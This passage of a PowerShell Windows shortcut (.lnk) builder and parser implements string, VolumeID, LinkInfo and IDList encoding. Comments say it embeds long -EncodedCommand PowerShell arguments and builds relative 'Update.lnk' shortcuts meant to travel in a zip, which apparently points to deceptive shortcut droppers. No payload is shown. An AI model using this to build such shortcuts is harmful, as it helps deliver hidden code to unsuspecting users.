        [string]$Value
    )

    if ($null -eq $Value) {
        $Value = ''
    }

    # .NET Encoding.Unicode is UTF-16LE.
    return [System.Text.Encoding]::Unicode.GetBytes($Value)
}

function ConvertFrom-Utf16Le {
    param(
        [Parameter(Mandatory = $true)]
        [byte[]]$Bytes
    )

    if (($Bytes.Length % 2) -ne 0) {
        Throw-ShellLinkError `
            "UTF-16LE string has an odd byte count."
    }

    return [System.Text.Encoding]::Unicode.GetString($Bytes)
}

function ConvertTo-PortableAnsi {
    param(
        [AllowNull()]
        [string]$Value
    )

    if ($null -eq $Value) {
        $Value = ''
    }

    # Shell Link ANSI fields are defined in terms of the system default
    # code page. A cross-platform creator cannot know the Windows target
    # machine's ACP, so the ANSI representation intentionally carries the
    # 7-bit invariant form where possible. The Unicode LinkInfo representation
    # remains authoritative and preserves every UTF-16 code unit exactly.
    [byte[]]$result = New-Object byte[] $Value.Length

    for ($i = 0; $i -lt $Value.Length; $i++) {

        [int]$code = [int][char]$Value[$i]

        if ($code -le 0x7F) {
            $result[$i] = [byte]$code
        }
        else {
            $result[$i] = 0x3F
        }
    }

    return $result
}

function ConvertFrom-PortableAnsi {
    param(
        [Parameter(Mandatory = $true)]
        [byte[]]$Bytes
    )

    # The writer emits a 7-bit-safe ANSI form.
    return [System.Text.Encoding]::ASCII.GetString($Bytes)
}
function New-AnsiZ {
    param(
        [AllowNull()]
        [string]$Value
    )

    $body = ConvertTo-PortableAnsi -Value $Value

    [byte[]]$result = New-Object byte[] ($body.Length + 1)

    if ($body.Length -gt 0) {
        [System.Array]::Copy(
            $body,
            0,
            $result,
            0,
            $body.Length
        )
    }

    $result[$body.Length] = 0

    return $result
}

function New-UnicodeZ {
    param(
        [AllowNull()]
        [string]$Value
    )

    $body = ConvertTo-Utf16Le -Value $Value

    [byte[]]$result = New-Object byte[] ($body.Length + 2)

    if ($body.Length -gt 0) {
        [System.Array]::Copy(
            $body,
            0,
            $result,
            0,
            $body.Length
        )
    }

    $result[$body.Length] = 0
    $result[$body.Length + 1] = 0

    return $result
}

function Read-AnsiZ {
    param(
        [Parameter(Mandatory = $true)]
        [byte[]]$Bytes,

        [Parameter(Mandatory = $true)]
        [int]$Offset,

        [Parameter(Mandatory = $true)]
        [int]$End,

        [string]$What = 'ANSI string'
    )

    if (
        $Offset -lt 0 -or
        $Offset -ge $End -or
        $End -gt $Bytes.Length
    ) {
        Throw-ShellLinkError `
            "$What begins outside its containing structure."
    }

    $position = $Offset

    while ($position -lt $End) {

        if ($Bytes[$position] -eq 0) {

            # Build the body inline: an empty slice returned through a function
            # call would be flattened to $null by the output pipeline on every
            # PowerShell runtime. Additionally, this runtime refuses to bind an
            # empty array to a typed function parameter, so an empty body is
            # decoded HERE without crossing a function boundary.
            [int]$bodyCount = $position - $Offset
            [string]$value = ''

            if ($bodyCount -gt 0) {

                [byte[]]$body = New-Object byte[] $bodyCount
                [System.Array]::Copy(
                    $Bytes,
                    $Offset,
                    $body,
                    0,
                    $bodyCount
                )

                $value = ConvertFrom-PortableAnsi -Bytes $body
            }

            return [pscustomobject]@{
                Value     = $value
                Start     = $Offset
                End       = $position + 1
                ByteCount = $position - $Offset
            }
        }

        $position++
    }

    Throw-ShellLinkError `
        "$What is not NUL-terminated within its containing structure."
}

function Read-UnicodeZ {
    param(
        [Parameter(Mandatory = $true)]
        [byte[]]$Bytes,

        [Parameter(Mandatory = $true)]
        [int]$Offset,

        [Parameter(Mandatory = $true)]
        [int]$End,

        [string]$What = 'Unicode string'
    )

    if (
        $Offset -lt 0 -or
        $Offset -ge $End -or
        $End -gt $Bytes.Length
    ) {
        Throw-ShellLinkError `
            "$What begins outside its containing structure."
    }

    if ((($End - $Offset) % 2) -ne 0) {
        Throw-ShellLinkError `
            "$What does not end on a UTF-16 code-unit boundary."
    }

    $position = $Offset

    while (($position + 1) -lt $End) {

        if (
            $Bytes[$position] -eq 0 -and
            $Bytes[$position + 1] -eq 0
        ) {

            [int]$bodyCount = $position - $Offset
            [string]$value = ''

            if ($bodyCount -gt 0) {

                [byte[]]$body = New-Object byte[] $bodyCount
                [System.Array]::Copy(
                    $Bytes,
                    $Offset,
                    $body,
                    0,
                    $bodyCount
                )

                $value = ConvertFrom-Utf16Le -Bytes $body
            }

            return [pscustomobject]@{
                Value     = $value
                Start     = $Offset
                End       = $position + 2
                ByteCount = $position - $Offset
            }
        }

        $position += 2
    }

    Throw-ShellLinkError `
        "$What is not NUL-terminated within its containing structure."
}
# ============================================================================
# StringData
# ============================================================================

# Integration delta (documented): [MS-SHLLINK] describes StringData strings as
# not longer than 260 characters, but Windows Explorer and liblnk write and
# read arbitrary-length COMMAND_LINE_ARGUMENTS, and this generator must embed a
# full -EncodedCommand (~1500..4000 characters) in the Arguments block. The
# documented 260-character recommendation is therefore superseded by a
# structural cap that (a) fits the on-disk CountCharacters WORD and (b) stays
# inside the Windows CreateProcess command-line limit. The binary layout is
# unchanged: CountCharacters (UTF-16 code units) followed by UTF-16LE chars.
$script:STRINGDATA_MAX_CHARACTERS = 0x7FFF

function New-StringData {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Value
    )

    if ($Value.Length -gt $script:STRINGDATA_MAX_CHARACTERS) {
        Throw-ShellLinkError `
            "StringData exceeds the supported ${script:STRINGDATA_MAX_CHARACTERS}-character limit."
    }

    # CountCharacters is UTF-16 code units.
    [uint16]$count = [uint16]$Value.Length

    [byte[]]$utf16 = ConvertTo-Utf16Le -Value $Value

    $buffer = New-ByteList

    Write-U16 `
        -Buffer $buffer `
        -Value $count

    foreach ($b in $utf16) {
        $buffer.Add($b)
    }

    # No terminating NUL belongs in StringData.
    return [byte[]]$buffer.ToArray()
}

function Parse-StringData {
    param(
        [Parameter(Mandatory = $true)]
        [byte[]]$Bytes,

        [Parameter(Mandatory = $true)]
        [int]$Offset,

        [Parameter(Mandatory = $true)]
        [bool]$IsUnicode,

        [Parameter(Mandatory = $true)]
        [string]$Name
    )

    Assert-ByteRange `
        -Bytes $Bytes `
        -Offset $Offset `
        -Length 2 `
        -What "$Name CountCharacters"

    [uint16]$count = Read-U16 `
        -Bytes $Bytes `
        -Offset $Offset

    if ($count -gt $script:STRINGDATA_MAX_CHARACTERS) {
        Throw-ShellLinkError `
            "$Name CountCharacters exceeds the supported ${script:STRINGDATA_MAX_CHARACTERS}-character maximum."
    }

    if ($IsUnicode) {
        [int]$byteCount = [int]$count * 2
    }
    else {
        [int]$byteCount = [int]$count
    }

    Assert-ByteRange `
        -Bytes $Bytes `
        -Offset ($Offset + 2) `
        -Length $byteCount `
        -What "$Name String"

    # Inline the body copy: an empty slice returned through a function call would
    # flatten to $null on the pipeline, and this runtime refuses to bind empty
    # arrays to typed parameters - decode empty bodies without crossing one.
    [string]$value = ''

    if ($byteCount -gt 0) {

        [byte[]]$body = New-Object byte[] $byteCount

        [System.Array]::Copy(
            $Bytes,
            $Offset + 2,
            $body,
            0,
            $byteCount
        )

        if ($IsUnicode) {
            $value = ConvertFrom-Utf16Le -Bytes $body
        }
        else {
            $value = ConvertFrom-PortableAnsi -Bytes $body
        }
    }

    return [pscustomobject]@{
        Name            = $Name
        CountCharacters = $count
        Value           = $value
        Offset          = $Offset
        EndOffset       = $Offset + 2 + $byteCount
    }
}
# ============================================================================
# Path helpers
# ============================================================================

function Normalize-WindowsPath {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path
    )

    return ($Path -replace '/', '\')
}

function Test-WindowsDriveAbsolute {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path
    )

    return ($Path -match '^[A-Za-z]:\\')
}

function Test-WindowsUNC {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path
    )

    return ($Path -match '^\\\\')
}

function Split-WindowsLocalTarget {
    param(
        [Parameter(Mandatory = $true)]
        [string]$TargetPath
    )

    $path = Normalize-WindowsPath -Path $TargetPath

    if ([string]::IsNullOrWhiteSpace($path)) {
        Throw-ShellLinkError "TargetPath cannot be empty."
    }

    if (Test-WindowsUNC -Path $path) {
        Throw-ShellLinkError `
            "UNC/network target writing is unsupported. No CommonNetworkRelativeLink writer is emitted."
    }

    if (-not (Test-WindowsDriveAbsolute -Path $path)) {

        return [pscustomobject]@{
            IsRelative = $true
            FullPath   = $path
            BasePath   = $null
            Suffix     = $null
        }
    }

    if ($path.Length -eq 2 -and $path[1] -eq ':') {
        $path += '\'
    }

    # Preserve the root exactly.
    if (
        $path.Length -eq 3 -and
        $path[1] -eq ':' -and
        $path[2] -eq '\'
    ) {

        return [pscustomobject]@{
            IsRelative = $false
            FullPath   = $path
            BasePath   = $path
            Suffix     = ''
        }
    }

    # Directory target with trailing slash.
    if ($path.EndsWith('\')) {

        $trimmed = $path.TrimEnd('\')

        if ($trimmed.Length -lt 3) {
            Throw-ShellLinkError "Invalid directory target: $TargetPath"
        }

        return [pscustomobject]@{
            IsRelative = $false
            FullPath   = $path
            BasePath   = $path
            Suffix     = ''
        }
    }

    $separator = $path.LastIndexOf('\')

    if ($separator -lt 2) {
        Throw-ShellLinkError `
            "Absolute Windows target has an invalid directory/leaf split."
    }

    $base = $path.Substring(0, $separator + 1)
    $suffix = $path.Substring($separator + 1)

    if ([string]::IsNullOrEmpty($suffix)) {
        Throw-ShellLinkError `
            "Local target suffix cannot be empty for a non-directory target."
    }

    return [pscustomobject]@{
        IsRelative = $false
        FullPath   = $path
        BasePath   = $base
        Suffix     = $suffix
    }
}
# ============================================================================
# VolumeID
# ============================================================================

function Get-DriveTypeForTarget {
    param(
        [Parameter(Mandatory = $true)]
        [string]$TargetPath
    )

    if (Test-WindowsDriveAbsolute -Path $TargetPath) {
        return $script:DRIVE_FIXED
    }

    if (Test-WindowsUNC -Path $TargetPath) {
        return $script:DRIVE_REMOTE
    }

    return $script:DRIVE_UNKNOWN
}

function Get-VolumeSerialBestEffort {
    param(
        [Parameter(Mandatory = $true)]
        [string]$TargetPath
    )

    if (-not $script:IsWindowsPlatform) {
        return [uint32]0
    }

    if (-not (Test-WindowsDriveAbsolute -Path $TargetPath)) {
        return [uint32]0
    }

    try {

        $drive = $TargetPath.Substring(0, 2)

        $disk = Get-CimInstance `
            -ClassName Win32_LogicalDisk `
            -Filter ("DeviceID='{0}'" -f $drive) `
            -ErrorAction Stop

        if ($null -eq $disk) {
            return [uint32]0
        }

        $text = [string]$disk.VolumeSerialNumber

        if ([string]::IsNullOrWhiteSpace($text)) {
            return [uint32]0
        }

        $text = $text -replace '[^0-9A-Fa-f]', ''

        if ($text.Length -eq 0) {
            return [uint32]0
        }

        if ($text.Length -gt 8) {
            $text = $text.Substring($text.Length - 8)
        }

        return [Convert]::ToUInt32($text, 16)
    }
    catch {
        return [uint32]0
    }
}

function New-VolumeID {
    param(
        [Parameter(Mandatory = $true)]
        [string]$TargetPath
    )

    $buffer = New-ByteList

    # Minimal structurally valid VolumeID:
    #
    #   DWORD VolumeIDSize       = 0x11
    #   DWORD DriveType
    #   DWORD DriveSerialNumber
    #   DWORD VolumeLabelOffset = 0x10
    #   CHAR  VolumeLabel[]     = empty NUL-terminated string
    #
    # VolumeLabelOffsetUnicode is therefore not specified.
    Write-U32 `
        -Buffer $buffer `
        -Value ([uint32]0x11)

    Write-U32 `
        -Buffer $buffer `
        -Value (Get-DriveTypeForTarget -TargetPath $TargetPath)

    Write-U32 `
        -Buffer $buffer `
        -Value (Get-VolumeSerialBestEffort -TargetPath $TargetPath)

    Write-U32 `
        -Buffer $buffer `
        -Value ([uint32]0x10)

    $buffer.Add([byte]0)

    return [byte[]]$buffer.ToArray()
}
function Parse-VolumeID {
    param(
        [Parameter(Mandatory = $true)]
        [byte[]]$Bytes,

        [Parameter(Mandatory = $true)]
        [int]$AbsoluteOffset,

        [Parameter(Mandatory = $true)]
        [int]$LinkInfoEnd
    )

    Assert-ByteRange `
        -Bytes $Bytes `
        -Offset $AbsoluteOffset `
        -Length 16 `
        -What 'VolumeID fixed fields'

    [uint32]$size = Read-U32 `
        -Bytes $Bytes `
        -Offset $AbsoluteOffset

    if ($size -le 0x10) {
        Throw-ShellLinkError `
            "VolumeIDSize must be greater than 0x10."
    }

    [int64]$volumeEnd64 = `
        [int64]$AbsoluteOffset + [int64]$size

    if ($volumeEnd64 -gt $LinkInfoEnd) {
        Throw-ShellLinkError `
            "VolumeID extends beyond LinkInfo."
    }

    [int]$volumeEnd = [int]$volumeEnd64

    [uint32]$driveType = Read-U32 `
        -Bytes $Bytes `
        -Offset ($AbsoluteOffset + 4)

    if ($driveType -gt 6) {
        Throw-ShellLinkError `
            "Invalid VolumeID DriveType: $driveType."
    }

    [uint32]$serial = Read-U32 `
        -Bytes $Bytes `
        -Offset ($AbsoluteOffset + 8)

    [uint32]$labelOffset = Read-U32 `
        -Bytes $Bytes `
        -Offset ($AbsoluteOffset + 12)

    if ($labelOffset -eq 0x14) {

        if ($size -lt 0x18) {
            Throw-ShellLinkError `
                "VolumeID uses the Unicode label marker but is too small."
        }

        [uint32]$unicodeOffset = Read-U32 `
            -Bytes $Bytes `
            -Offset ($AbsoluteOffset + 16)

        if (
            $unicodeOffset -lt 0x18 -or
            $unicodeOffset -ge $size
        ) {
            Throw-ShellLinkError `
                "VolumeLabelOffsetUnicode lies outside VolumeID."
        }

        $label = Read-UnicodeZ `
            -Bytes $Bytes `
            -Offset ($AbsoluteOffset + [int]$unicodeOffset) `
            -End $volumeEnd `
            -What 'VolumeID Unicode label'

        return [pscustomobject]@{
            Size                     = $size
            DriveType                = $driveType
            DriveSerialNumber        = $serial
            VolumeLabelOffset        = $labelOffset
            VolumeLabelOffsetUnicode = $unicodeOffset
            VolumeLabel               = $label.Value
            EndOffset                 = $volumeEnd
        }
    }

    if (
        $labelOffset -lt 0x10 -or
        $labelOffset -ge $size
    ) {
        Throw-ShellLinkError `
            "VolumeLabelOffset lies outside VolumeID."
    }

    $label = Read-AnsiZ `
        -Bytes $Bytes `
        -Offset ($AbsoluteOffset + [int]$labelOffset) `
        -End $volumeEnd `
        -What 'VolumeID ANSI label'

    return [pscustomobject]@{
        Size                     = $size
        DriveType                = $driveType
        DriveSerialNumber        = $serial
        VolumeLabelOffset        = $labelOffset
        VolumeLabelOffsetUnicode = $null
        VolumeLabel              = $label.Value
        EndOffset                = $volumeEnd
    }
}
# ============================================================================
# LinkInfo writer
# ============================================================================

function New-LinkInfo {
    param(
        [Parameter(Mandatory = $true)]
        [string]$BasePath,

        [Parameter(Mandatory = $true)]
        [string]$Suffix,

        [Parameter(Mandatory = $true)]
        [string]$TargetPath
    )

    # We deliberately emit the Unicode-capable LinkInfo form.
    $volume = New-VolumeID -TargetPath $TargetPath
    $baseAnsi = New-AnsiZ -Value $BasePath
    $suffixAnsi = New-AnsiZ -Value $Suffix
    $baseUnicode = New-UnicodeZ -Value $BasePath
    $suffixUnicode = New-UnicodeZ -Value $Suffix

    [int]$headerSize = $script:LINKINFO_HEADER_UNICODE

    [int]$volumeOffset = $headerSize
    [int]$baseOffset = $volumeOffset + $volume.Length
    [int]$suffixOffset = $baseOffset + $baseAnsi.Length
    [int]$baseUnicodeOffset = $suffixOffset + $suffixAnsi.Length
    [int]$suffixUnicodeOffset = $baseUnicodeOffset + $baseUnicode.Length
    [int]$linkInfoSize = $suffixUnicodeOffset + $suffixUnicode.Length

    # DWORD LinkInfoSize is 32-bit. Compare in Int64 domain: the raw hex
    # literal 0xFFFFFFFF parses as a NEGATIVE Int32 on some PowerShell runtimes
    # (a negative-size guard would then always fire), so use the decimal
    # Int64 form 4294967295, which is unambiguous on every runtime.
    if ([int64]$linkInfoSize -gt [int64]4294967295) {
        Throw-ShellLinkError "LinkInfo is too large."
    }

    $buffer = New-ByteList

    Write-U32 `
        -Buffer $buffer `
        -Value ([uint32]$linkInfoSize)

    Write-U32 `
        -Buffer $buffer `
        -Value ([uint32]$headerSize)

    # VolumeIDAndLocalBasePath.
    Write-U32 `
        -Buffer $buffer `
        -Value $script:LINKINFO_FLAG_VOLUME_AND_LOCAL

    Write-U32 `
        -Buffer $buffer `
        -Value ([uint32]$volumeOffset)

    Write-U32 `
        -Buffer $buffer `
        -Value ([uint32]$baseOffset)

    # No CommonNetworkRelativeLink.
    Write-U32 `
        -Buffer $buffer `
        -Value ([uint32]0)

    Write-U32 `
        -Buffer $buffer `
        -Value ([uint32]$suffixOffset)

    Write-U32 `
        -Buffer $buffer `
        -Value ([uint32]$baseUnicodeOffset)

    Write-U32 `
        -Buffer $buffer `
        -Value ([uint32]$suffixUnicodeOffset)

    foreach ($b in $volume) {
        $buffer.Add($b)
    }

    foreach ($b in $baseAnsi) {
        $buffer.Add($b)
    }

    foreach ($b in $suffixAnsi) {
        $buffer.Add($b)
    }

    foreach ($b in $baseUnicode) {
        $buffer.Add($b)
    }

    foreach ($b in $suffixUnicode) {
        $buffer.Add($b)
    }

    [byte[]]$result = [byte[]]$buffer.ToArray()

    if ($result.Length -ne $linkInfoSize) {
        Throw-ShellLinkError `
            "Internal LinkInfo size calculation mismatch."
    }

    return $result
}
# ============================================================================
# Relative LinkInfo writer (self-contained relative-target shortcut)
# ============================================================================
# A 0x1C-byte LinkInfo header with VolumeIDAndLocalBasePath CLEAR and all path
# offsets zero, plus an empty ANSI Z CommonPathSuffix (1 byte). This is the
# standard "relative link" stub: Windows combines it with the RELATIVE_PATH
# StringData to resolve the target against the .lnk's own folder, which is
# exactly what a zip-carried {Update.lnk, Launcher.exe} pair needs. Without it
# HasLinkInfo is absent and a bare relative .lnk double-click silently does
# nothing on modern Explorer.
function New-RelativeLinkInfo {
    param()
    [System.UInt32]$headerSize = [System.UInt32]$script:LINKINFO_HEADER_LEGACY
    # Empty ANSI Z CommonPathSuffix sits immediately after the header.
    [System.UInt32]$suffixOffset = $headerSize
    [System.UInt32]$linkInfoSize = $suffixOffset + 1

    $buffer = New-ByteList

    Write-U32 -Buffer $buffer -Value $linkInfoSize
    Write-U32 -Buffer $buffer -Value $headerSize
    Write-U32 -Buffer $buffer -Value ([System.UInt32]0) # flags: relative (no volume/local)
    Write-U32 -Buffer $buffer -Value ([System.UInt32]0) # VolumeIDOffset
    Write-U32 -Buffer $buffer -Value ([System.UInt32]0) # LocalBasePathOffset
    Write-U32 -Buffer $buffer -Value ([System.UInt32]0) # CommonNetworkRelativeLinkOffset
    Write-U32 -Buffer $buffer -Value $suffixOffset      # CommonPathSuffixOffset
    $buffer.Add([byte]0)                                # empty ANSI Z CommonPathSuffix

    [byte[]]$result = [byte[]]$buffer.ToArray()

    if ($result.Length -ne $linkInfoSize) {
        Throw-ShellLinkError `
            "Internal relative LinkInfo size calculation mismatch."
    }

    return $result
}
# ============================================================================
# LinkTargetIDList writer (file-system PIDL for drive-rooted file targets)
# ============================================================================

function New-IdListFileEntry {
    param(
        [Parameter(Mandatory = $true)]
        [byte]$Class,          # 0x31 = directory, 0x32 = file

        [Parameter(Mandatory = $true)]
        [string]$Name,

        [Parameter(Mandatory = $true)]
        [uint16]$Attributes
    )

    $nameBytes = [System.Text.Encoding]::ASCII.GetBytes($Name)

    foreach ($c in $nameBytes) {
        if ($c -gt 0x7F) {
            Throw-ShellLinkError `
                "LinkTargetIDList file entry name must be ASCII: $Name"
        }
    }

    # Windows XP+ file entry shell item fixed prefix (Windows Shell Item
    # format, libfwsi): class (1) + unknown (1) + file size (4) + FAT
    # date/time (4) + file attribute flags (2), then the primary name.
    [int]$dataLength = 1 + 1 + 4 + 4 + 2 + $nameBytes.Length + 1

    # The primary name is 16-bit aligned: odd lengths carry one pad byte.
    if (($nameBytes.Length + 1) % 2 -ne 0) {
        $dataLength += 1
    }

    if ($dataLength -gt 0xFFFD) {
        Throw-ShellLinkError `
            "LinkTargetIDList file entry item exceeds the ItemID size limit."
    }

    $item = New-Object byte[] $dataLength
    $item[0] = $Class
    # item[1] = 0 (unknown)
    # item[2..5]  = file size 0
    # item[6..9]  = FAT date/time 0
    $item[10] = [byte]($Attributes -band 0xFF)
    $item[11] = [byte](($Attributes -shr 8) -band 0xFF)
    [System.Array]::Copy($nameBytes, 0, $item, 12, $nameBytes.Length)
    $item[12 + $nameBytes.Length] = 0     # ASCII-Z terminator

    $buffer = New-ByteList
    Write-U16 `
        -Buffer $buffer `
        -Value ([uint16]($item.Length + 2))
    foreach ($b in $item) {
        $buffer.Add($b)
    }

    return [byte[]]$buffer.ToArray()
}

function New-LinkTargetIDList {
    param(
        [Parameter(Mandatory = $true)]
        [string]$BasePath,     # directory portion, e.g. 'C:\Windows\System32\v1.0\'

        [Parameter(Mandatory = $true)]
        [string]$Suffix        # target file name, e.g. 'powershell.exe'
    )

    # A Windows file-system PIDL walks the shell namespace from My Computer
    # through the volume and folders to the target file. IShellLink::GetPath
    # (the property behind WScript.Shell Shortcut.TargetPath) resolves the
    # shortcut target from this IDList; a .lnk that only carries LinkInfo
    # strings leaves TargetPath empty even though the path bytes are on disk.
    #
    # Item bytes follow the Windows Shell Item format (libfwsi):
    #   item 0: My Computer root  - 0x1F 0x50 + {20D04FE0-3AEA-1069-A2D8-08002B30309D}
    #   item 1: volume "has name" - 0x2F + "C:\" padded to 20 bytes + 2 unknown bytes
    #   items:  file entries      - 0x31/0x32 + size/date/attributes + name
    $drive = $null

    if ($BasePath.Length -ge 2 -and $BasePath[1] -eq ':') {
        $drive = $BasePath.Substring(0, 2)
    }

    if ([string]::IsNullOrEmpty($drive)) {
        Throw-ShellLinkError `
            "New-LinkTargetIDList requires a drive-rooted BasePath: $BasePath"
    }

    if ([string]::IsNullOrEmpty($Suffix)) {
        Throw-ShellLinkError `
            "New-LinkTargetIDList requires a non-empty file suffix."
    }

    $dirs = New-Object 'System.Collections.Generic.List[string]'
    $pathPart = $BasePath.Substring(2).Trim('\')

    if (-not [string]::IsNullOrEmpty($pathPart)) {
        foreach ($d in $pathPart.Split('\')) {
            if (-not [string]::IsNullOrEmpty($d)) {
                $dirs.Add($d)
            }
        }
    }

    $buffer = New-ByteList

    # ---- Item 0: My Computer (root folder shell item) ----
    Write-U16 -Buffer $buffer -Value ([uint16]0x14)
    $rootData = [byte[]]@(
        0x1F, 0x50,
        0xE0, 0x4F, 0xD0, 0x20, 0xEA, 0x3A, 0x69, 0x10,
        0xA2, 0xD8, 0x08, 0x00, 0x2B, 0x30, 0x30, 0x9D
    )
    foreach ($b in $rootData) {
        $buffer.Add($b)
    }

    # ---- Item 1: volume shell item ('has name' form) ----
    $driveBytes = [System.Text.Encoding]::ASCII.GetBytes($drive + '\')
    $volumeItem = New-Object byte[] (1 + 20 + 2)
    $volumeItem[0] = 0x2F
    [System.Array]::Copy($driveBytes, 0, $volumeItem, 1, $driveBytes.Length)

    Write-U16 `
        -Buffer $buffer `
        -Value ([uint16]($volumeItem.Length + 2))
    foreach ($b in $volumeItem) {
        $buffer.Add($b)
    }

    # ---- Items 2..n-1: directory file entries ----
    foreach ($d in $dirs) {
        foreach ($b in (New-IdListFileEntry -Class 0x31 -Name $d -Attributes 0x10)) {
            $buffer.Add($b)
        }
    }

    # ---- Item n: the target file ----
    foreach ($b in (New-IdListFileEntry -Class 0x32 -Name $Suffix -Attributes 0x20)) {
        $buffer.Add($b)
    }

    # ---- TerminalID: zero-length terminating ItemID ----
    Write-U16 -Buffer $buffer -Value ([uint16]0)

    [byte[]]$body = [byte[]]$buffer.ToArray()

    if ($body.Length -gt 0xFFFD) {
        Throw-ShellLinkError `
            "LinkTargetIDList exceeds the IDListSize limit of 0xFFFF."
    }

    $result = New-ByteList
    Write-U16 -Buffer $result -Value ([uint16]$body.Length)
    foreach ($b in $body) {
        $result.Add($b)
    }

    [byte[]]$allBytes = [byte[]]$result.ToArray()

    if ($allBytes.Length -ne ($body.Length + 2)) {
        Throw-ShellLinkError `
            "Internal LinkTargetIDList size mismatch."
    }

    return [pscustomobject]@{
        Bytes = $allBytes
        Size  = $body.Length
    }
}

function ConvertFrom-LinkTargetIDList {
    param(
        [Parameter(Mandatory = $true)]
        [object[]]$Items    # ItemID objects as produced by Parse-LinkTargetIDList
    )

    # Reconstructs "C:\dir\...\file" from a standard file-system PIDL.
    # Returns $null (never throws) when the IDList does not follow the
    # canonical My Computer -> volume -> file entry shape, so foreign but
    # structurally valid IDLists remain parseable by the validator.

    if ($Items.Count -lt 2) {
        return $null
    }

    [byte[]]$rootData = $Items[0].Data

    if ($rootData.Length -lt 2 -or $rootData[0] -ne 0x1F) {
        return $null
    }

    [byte[]]$volumeData = $Items[1].Data

    if ($volumeData.Length -lt 4 -or (($volumeData[0] -band 0x70) -ne 0x20)) {
        return $null
    }

    # 'Has name' volume form: "C:\" follows the class type indicator.
    if (($volumeData[0] -band 0x01) -eq 0 -or $volumeData[1] -eq 0) {
        return $null
    }

    $drivePrefix = [System.Text.Encoding]::ASCII.GetString($volumeData, 1, 3)

    $nameParts = New-Object 'System.Collections.Generic.List[string]'

    for ($i = 2; $i -lt $Items.Count; $i++) {
        [byte[]]$itemData = $Items[$i].Data

        if ($itemData.Length -lt 13) {
            return $null
        }

        $class = $itemData[0]

        if (($class -band 0x70) -ne 0x30) {
            return $null
        }

        if (($class -band 0x03) -eq 0) {
            return $null
        }

        # Primary name starts at data offset 12. ANSI unless the 'has Unicode
        # strings' flag (0x04) is set.
        $name = $null

        if (($class -band 0x04) -ne 0) {
            $unicode = Read-UnicodeZ `
                -Bytes $itemData `
                -Offset 12 `
                -End $itemData.Length `
                -What 'LinkTargetIDList item Unicode name'
            $name = $unicode.Value
        }
        else {
            $nul = -1
            for ($j = 12; $j -lt $itemData.Length; $j++) {
                if ($itemData[$j] -eq 0) {
                    $nul = $j
                    break
                }
            }
            if ($nul -lt 0) {
                return $null
            }

            $name = [System.Text.Encoding]::ASCII.GetString($itemData, 12, $nul - 12)
        }

        if ([string]::IsNullOrEmpty($name)) {
            return $null
        }

        $nameParts.Add($name)
    }

    if ($nameParts.Count -eq 0) {
        return $null
    }

    $builder = New-Object 'System.Text.StringBuilder'
    [void]$builder.Append($drivePrefix.TrimEnd('\'))

    for ($i = 0; $i -lt $nameParts.Count; $i++) {
        [void]$builder.Append('\')
        [void]$builder.Append($nameParts[$i])
    }

    return $builder.ToString()
}

# ============================================================================
# LinkInfo parser
# ============================================================================

function Assert-LinkInfoOffset {
    param(
        [Parameter(Mandatory = $true)]
        [uint32]$Offset,

        [Parameter(Mandatory = $true)]
        [uint32]$LinkInfoSize,

        [Parameter(Mandatory = $true)]
        [uint32]$HeaderSize,

        [Parameter(Mandatory = $true)]
        [string]$Name,

        [switch]$AllowZero
    )

    if ($Offset -eq 0) {

        if ($AllowZero) {
            return
        }

        Throw-ShellLinkError "$Name is zero."
    }

    if ($Offset -lt $HeaderSize) {
        Throw-ShellLinkError `
            "$Name points inside the LinkInfo header."
    }

    if ($Offset -ge $LinkInfoSize) {
        Throw-ShellLinkError `
            "$Name points outside LinkInfo."
    }
}

function Assert-NonOverlappingRanges {
    param(
        [Parameter(Mandatory = $true)]
        [object[]]$Ranges
    )

    $ordered = @(
        $Ranges |
            Where-Object { $null -ne $_ } |
            Sort-Object Start
    )

    for ($i = 1; $i -lt $ordered.Count; $i++) {

        $previous = $ordered[$i - 1]
        $current = $ordered[$i]

        if ($current.Start -lt $previous.End) {
            Throw-ShellLinkError `
                "LinkInfo data ranges overlap: '$($previous.Name)' and '$($current.Name)'."
        }
    }
}
function Parse-LinkInfo {
    param(
        [Parameter(Mandatory = $true)]
        [byte[]]$Bytes,

        [Parameter(Mandatory = $true)]
        [int]$Offset
    )

    Assert-ByteRange `
        -Bytes $Bytes `
        -Offset $Offset `
        -Length 8 `
        -What 'LinkInfo fixed header'

    [uint32]$size = Read-U32 `
        -Bytes $Bytes `
        -Offset $Offset

    [uint32]$headerSize = Read-U32 `
        -Bytes $Bytes `
        -Offset ($Offset + 4)

    if ($size -lt [uint32]$script:LINKINFO_HEADER_LEGACY) {
        Throw-ShellLinkError `
            "LinkInfoSize is smaller than 0x1C."
    }

    if ($size -gt [uint32]($Bytes.Length - $Offset)) {
        Throw-ShellLinkError `
            "LinkInfoSize extends beyond the file."
    }

    if (
        $headerSize -ne [uint32]$script:LINKINFO_HEADER_LEGACY -and
        $headerSize -ne [uint32]$script:LINKINFO_HEADER_UNICODE
    ) {
        Throw-ShellLinkError `
            ("Unsupported LinkInfoHeaderSize 0x{0:X8}; supported forms are 0x1C and 0x24." -f $headerSize)
    }

    if ($headerSize -gt $size) {
        Throw-ShellLinkError `
            "LinkInfoHeaderSize exceeds LinkInfoSize."
    }

    Assert-ByteRange `
        -Bytes $Bytes `
        -Offset $Offset `
        -Length ([int]$headerSize) `
        -What 'LinkInfo header'

    [uint32]$flags = Read-U32 `
        -Bytes $Bytes `
        -Offset ($Offset + 8)

    if (($flags -band $script:LINKINFO_UNDEFINED_MASK) -ne 0) {
        Throw-ShellLinkError `
            ("Undefined LinkInfoFlags are set: 0x{0:X8}" -f $flags)
    }

    [uint32]$volumeOffset = Read-U32 `
        -Bytes $Bytes `
        -Offset ($Offset + 12)

    [uint32]$baseOffset = Read-U32 `
        -Bytes $Bytes `
        -Offset ($Offset + 16)

    [uint32]$networkOffset = Read-U32 `
        -Bytes $Bytes `
        -Offset ($Offset + 20)

    [uint32]$suffixOffset = Read-U32 `
        -Bytes $Bytes `
        -Offset ($Offset + 24)

    [uint32]$baseUnicodeOffset = 0
    [uint32]$suffixUnicodeOffset = 0

    if ($headerSize -eq [uint32]$script:LINKINFO_HEADER_UNICODE) {

        $baseUnicodeOffset = Read-U32 `
            -Bytes $Bytes `
            -Offset ($Offset + 28)

        $suffixUnicodeOffset = Read-U32 `
            -Bytes $Bytes `
            -Offset ($Offset + 32)
    }

    $hasLocal = (
        ($flags -band $script:LINKINFO_FLAG_VOLUME_AND_LOCAL) -ne 0
    )

    $hasNetwork = (
